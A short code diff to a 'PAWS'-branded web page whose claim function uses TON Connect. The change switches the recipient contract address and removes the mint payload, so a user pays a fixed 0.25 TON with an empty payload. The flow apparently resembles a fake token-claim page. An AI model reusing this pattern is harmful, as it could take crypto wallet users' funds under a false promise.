@@ -211,7 +211,7 @@ alt="PAWS Logo" class="logo">
 
 <!-- Scripts -->
 <script>
-const CONTRACT_ADDRESS = 'EQBC9b38kma4eOqGzf7naWryHKK9_wMxr9Oyari3G4G_WYIj';
+const CONTRACT_ADDRESS = 'EQDSCLEGoE2gHk0AwgCL_AIlon4KUCpAP2cD0hhFX3h3kXt7';
 const REQUIRED_AMOUNT = '247000000'; // 0.247 TON in nanotons
 
 // Initialize TON Connect with correct options
@@ -261,7 +261,7 @@ function showMessage(message) {
     });
 }
 
-// Update transaction handling
+// Update handleClaim function
 async function handleClaim() {
     try {
         if (!tonConnect.connected) {
@@ -269,16 +269,13 @@ async function handleClaim() {
             return;
         }
 
-        // Transaction yapısı
+        // Basit transaction yapısı
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 600,
             messages: [{
                 address: CONTRACT_ADDRESS,
-                amount: REQUIRED_AMOUNT,
-                payload: {
-                    $$type: 'Mint',
-                    queryId: '0'
-                }
+                amount: '250000000', // 0.25 TON (sabit miktar)
+                payload: '' // Boş payload
             }]
         };
 
